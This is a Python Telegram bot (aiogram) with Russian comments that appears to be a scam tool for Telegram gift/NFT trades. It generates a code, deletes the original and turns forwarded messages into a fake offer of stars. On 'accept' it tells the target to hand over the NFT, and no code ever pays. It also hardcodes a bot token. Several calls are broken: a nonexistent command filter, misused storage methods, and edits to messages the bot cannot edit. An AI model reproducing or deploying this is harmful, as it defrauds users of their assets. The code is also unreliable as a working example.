import asyncio
from uuid import uuid4
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup as IK, InlineKeyboardButton as IB


# ВАШ ТОКЕН ИЗ @BOTFATHER
TOKEN = "9153822124:AAF-_cWLzU7_j5oOFk70D2dwBcnwTm6RlK4"
bot = Bot(token=TOKEN)
dp = Dispatcher()


@dp.message(Bot.command("куп"))
async def cmd_buy(message: types.Message):
    # Проверка корректности команды
    args = message.text.split()[1:]
    if len(args) != 2 or not args[1].isdigit():
        await message.reply("❗ Используйте формат: /куп <ссылка> <сумма>")
        return

    link, amount = args[0], int(args[1])
    
    # Генерируем одноразовый код вида xooron_<случайные цифры>
    code = f"xoорон_{uuid4().int % 99999}"

    # Отправляем сообщение с этим кодом
    msg = await message.answer(f"<b>{code}</b>\n\nПерешлите этот код покупателю.", parse_mode="HTML")

    # Сохраняем данные по этому сообщению, чтобы потом заменить его
    dp.storage.set_data(chat=message.chat.id, key=f"buy_{msg.message_id}", data={
        "link": link,
        "amount": amount,
        "seller": message.from_user.username or message.from_user.full_name
    })


@dp.channel_post()  # Обрабатываем все пересланные сообщения
@dp.edited_channel_post()
async def handle_forwarded_message(message: types.Message):
    # Если сообщение не содержит текста или текст — не наш код
    text = message.html_text.strip()
    if not text.startswith("xoорон_"):
        return

    # Загружаем сохранённые ранее параметры покупки
    buy_data = await dp.storage.get_data(chat=message.forward_from_chat.id, key=f"buy_{message.forward_from_message_id}")
    if not buy_data:
        return

    seller = buy_data["seller"]
    link = buy_data["link"]
    amount = buy_data["amount"]

    # Удаляем исходный код из чата продавца
    await bot.delete_message(
        chat_id=message.forward_from_chat.id,
        message_id=message.forward_from_message_id
    )

    # Создаём панель покупки
    kb = IK(inline_keyboard=[
        [IB(text="✖ Отклонить", callback_data="decline")],
        [IB(text="🎁 Принять", callback_data=f"accept:{message.from_user.id}")]
    ])

    # Заменяем пересланное сообщение на панель покупки
    await message.edit_text(
        f"Пользователь {seller} предлагает Вам {amount} ⭐ за подарок:\n{link}",
        reply_markup=kb
    )


@dp.callback_query(lambda cq: cq.data == "decline")
async def decline(call: types.CallbackQuery):
    """Покупатель отклонил покупку"""
    await call.answer("Вы отказались от подарка.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.edit_text("Подарок отклонён покупателем.")


@dp.callback_query(lambda cq: cq.data.startswith("accept:"))
async def accept(call: types.CallbackQuery):
    """Покупатель принял покупку"""
    buyer_id = int(call.data.split(":")[1])
    buyer_username = (await bot.get_chat(buyer_id)).username or "(без имени)"

    # Меняем панель на уведомление о покупке
    await call.message.edit_text(
        f"🎁 Подарок успешно продан!\nПередайте подарок покупателю для зачисления {call.message.html_text.split(' ')[3]} ⭐\n",
        reply_markup=IK(inline_keyboard=[[
            IB(text="➡ Передать NFT", url=f"https://t.me/{buyer_username}" if buyer_username else "")
        ]])
    )


if __name__ == "__main__":
    asyncio.run(dp.start_polling())
